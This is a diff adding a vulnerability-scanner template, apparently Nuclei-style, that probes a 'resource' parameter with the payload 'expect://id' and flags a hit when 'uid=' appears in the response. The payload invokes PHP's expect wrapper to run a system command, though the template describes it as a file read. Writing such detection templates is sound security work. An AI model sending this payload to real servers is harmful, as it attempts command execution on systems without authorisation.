@@ -1,0 +1,20 @@
+id: lfi6-0762
+name: 'Traversal in resource'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via resource'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      resource:
+        - 'expect://id'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
